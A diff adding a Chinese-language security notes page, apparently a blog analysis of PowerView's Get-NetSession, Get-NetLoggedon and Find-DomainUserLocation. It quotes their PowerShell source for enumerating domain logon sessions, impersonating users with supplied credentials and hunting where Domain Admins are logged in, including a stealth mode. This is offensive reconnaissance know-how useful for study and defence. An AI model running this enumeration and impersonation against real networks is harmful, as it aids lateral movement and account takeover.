+                    netsh wlan start hostednetwork
+                    break
+                }
+            }
+        }
+</code></pre>
+<h2 id="powerview">powerview</h2>
+<h3 id="get-netsession">Get-NetSession</h3>
+<p>从一台机器上获取用户登录信息</p>
+<h4 id="_4">参数</h4>
+<p>第一个参数是指定机器的IP或机器名
+第二个参数是一个powershell下的用户凭证信息类，可以详见这里<a href="https://docs.microsoft.com/en-us/powershell/scripting/learn/deep-dives/add-credentials-to-powershell-functions?view=powershell-7.1" title="https://docs.microsoft.com/en-us/powershell/scripting/learn/deep-dives/add-credentials-to-powershell-functions?view=powershell-7.1">https://docs.microsoft.com/en-us/powershell/scripting/learn/deep-dives/add-credentials-to-powershell-functions?view=powershell-7.1</a>,</p>
+<pre><code class="language-纯文本">Param(
+        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
+        [Alias('HostName', 'dnshostname', 'name')]
+        [ValidateNotNullOrEmpty()]
+        [String[]]
+        $ComputerName = 'localhost',
+
+        [Management.Automation.PSCredential]
+        [Management.Automation.CredentialAttribute()]
+        $Credential = [Management.Automation.PSCredential]::Empty
+    )
+</code></pre>
+<h4 id="_5">具体逻辑</h4>
+<pre><code class="language-纯文本">BEGIN {
+        if ($PSBoundParameters['Credential']) {
+            $LogonToken = Invoke-UserImpersonation -Credential $Credential
+        }
+    }
+</code></pre>
+<p>一开始会通过设置的Credential参数来模拟令牌</p>
+<pre><code class="language-纯文本">ForEach ($Computer in $ComputerName) {
+            # arguments for NetSessionEnum
+            $QueryLevel = 10
+            $PtrInfo = [IntPtr]::Zero
+            $EntriesRead = 0
+            $TotalRead = 0
+            $ResumeHandle = 0
+
+            # get session information
+            $Result = $Netapi32::NetSessionEnum($Computer, '', $UserName, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)
+
+            # locate the offset of the initial intPtr
+            $Offset = $PtrInfo.ToInt64()
+
+</code></pre>
+<p>然后会循环遍历computername中的机器名，分别调用Netapi32::NetSessionEnum方法来获取session信息
+这个API的相关定义如下（微软官方文档已经删除了这个API的定义）</p>
+<p><img alt="image-20210927200359461" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210927200359461.png" title="image-20210927200359461" /></p>
+<ul>
+<li><strong>servername :</strong> 该字符串指定要在其上执行函数的远程服务器的DNS或NetBIOS名称。如果此参数为<code>NULL</code>，则使用本地计算机。</li>
+<li><strong>UncClientName：</strong> 该字符串指定要为其返回信息的计算机会话的名称。如果此参数为<code>NULL</code>，则 <code>NetSessionEnum</code> 将返回服务器上所有计算机会话的信息。</li>
+<li><strong>username:</strong> 该字符串指定要为其返回信息的用户的名称。如果此参数为<code>NULL</code>，则 <code>NetSessionEnum</code> 将返回所有用户的信息。</li>
+<li><strong>level：</strong> 指定数据的信息级别。</li>
+<li><strong>bufptr：</strong> 指向接收数据的缓冲区的指针。此数据的格式取决于<code>level</code> 参数的值。此缓冲区由系统分配，必须使用 <a href="https://docs.microsoft.com/windows/desktop/api/lmapibuf/nf-lmapibuf-netapibufferfree" title="NetApiBufferFree">NetApiBufferFree</a> 函数释放 。请注意，即使函数因 <code>ERROR_MORE_DATA</code> 而失败，也必须释放缓冲区。</li>
+<li>prefmaxlen: 缓冲区大小
+    它不允许直接查询是谁登陆了此工作站，但是它允许查询是谁在访问此工作站的网络资源（例如文件共享）时所创建的网络会话，从而知道来自何处。当然这里最好的查询对象是域控 + 文件共享服务器。此函数不需要高权限。
+    这部分的大致意思便是循环读取缓冲区里的内容，并将内容格式化后输出
+    ```纯文本
+     # 0 = success
+                if (($Result -eq 0) -and ($Offset -gt 0)) {<pre><code>            # work out how much to increment the pointer by finding out the size of the structure
+            $Increment = $SESSION_INFO_10::GetSize()
+
+            # parse all the result structures
+            for ($i = 0; ($i -lt $EntriesRead); $i++) {
+                # create a new int ptr at the given offset and cast the pointer as our result structure
+                $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
+                $Info = $NewIntPtr -as $SESSION_INFO_10 //-as 将指针转化为指定类型（SESSION_INFO_10结构体）
+
+                # return all the sections of the structure - have to do it this way for V2
+                $Session = $Info | Select-Object *
+                $Session | Add-Member Noteproperty 'ComputerName' $Computer
+                $Session.PSObject.TypeNames.Insert(0, 'PowerView.SessionInfo')
+                $Offset = $NewIntPtr.ToInt64()
+                $Offset += $Increment
+                $Session
+            }
+
+            # free up the result buffer
+            $Null = $Netapi32::NetApiBufferFree($PtrInfo)
+        }
+        else {
+            Write-Verbose "[Get-NetSession] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
+        }
+</code></pre>
+<p>```</p>
+</li>
+</ul>
+<h3 id="get-netloggedon">Get-NetLoggedon</h3>
+<p>和Get-NetSession差不多，也是用于查询某机器上的登录会话，但是Get-NetSession是以NetSessionEnum Api为核心，Get-NetLoggedon是以NetWkstaUserEnum Api为核心</p>
+<h4 id="_6">具体逻辑</h4>
+<p>逻辑和Get-NetSession差不多，这里就着重介绍一下NetWkstaUserEnum  这个API</p>
+<p>该 <strong>NetWkstaUserEnum</strong> 功能可以列出当前登录到该工作站的所有用户的信息。此列表包括交互式、服务和批量登录。此函数需要主机的管理权限或这域管权限，适用于自检使用。</p>
+<p><img alt="image-20210927204821273" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210927204821273.png" title="image-20210927204821273" /></p>
+<ul>
+<li><strong>servername：</strong> 该字符串指定要在其上执行函数的远程服务器的DNS或NetBIOS名称。如果此参数为<code>NULL</code>，则使用本地计算机。</li>
+<li><strong>level：</strong> 指定数据的信息级别。</li>
+<li><strong>bufptr：</strong> 指向接收数据的缓冲区的指针。此数据的格式取决于<code>level</code> 参数的值。此缓冲区由系统分配，必须使用 <a href="https://docs.microsoft.com/windows/desktop/api/lmapibuf/nf-lmapibuf-netapibufferfree" title="NetApiBufferFree">NetApiBufferFree</a> 函数释放 。请注意，即使函数因 <code>ERROR_MORE_DATA</code> 而失败，也必须释放缓冲区。</li>
+</ul>
+<h3 id="find-domainuserlocation">Find-DomainUserLocation</h3>
+<p>Find-DomainUserLocation是一个用于定位用户在哪台机器上登录的脚本</p>
+<p>这个脚本其实就是个缝合怪，它的逻辑如下</p>
+<h4 id="_7">具体逻辑</h4>
+<p>这是它自己的解释</p>
+<pre><code class="language-纯文本">This function enumerates all machines on the current (or specified) domain
+using Get-DomainComputer, and queries the domain for users of a specified group
+(default 'Domain Admins') with Get-DomainGroupMember. Then for each server the
+function enumerates any active user sessions with Get-NetSession/Get-NetLoggedon
+The found user list is compared against the target list, and any matches are
+displayed. If -ShowAll is specified, all results are displayed instead of
+the filtered set. If -Stealth is specified, then likely highly-trafficed servers
+are enumerated with Get-DomainFileServer/Get-DomainController, and session
+enumeration is executed only against those servers. If -Credential is passed,
+then Invoke-UserImpersonation is used to impersonate the specified user
+before enumeration, reverting after with Invoke-RevertToSelf.
+</code></pre>
+<pre><code class="language-纯文本">先调用Get-DomainComputer获取域中计算机名，然后通过Get-DomainUser,Get-DomainGroupMember 来获取域中用户信息，然后通过Get-NetSession/Get-NetLoggedon来查询各计算机中的登录会话信息。
+</code></pre>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../../../%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../../../%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/" class="btn btn-xs btn-link">
+        渗透路径&沉淀
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../Mimikatz%E5%88%86%E6%9E%90/Mimikatz%E5%88%86%E6%9E%90/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../Mimikatz%E5%88%86%E6%9E%90/Mimikatz%E5%88%86%E6%9E%90/" class="btn btn-xs btn-link">
+        Mimikatz分析
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
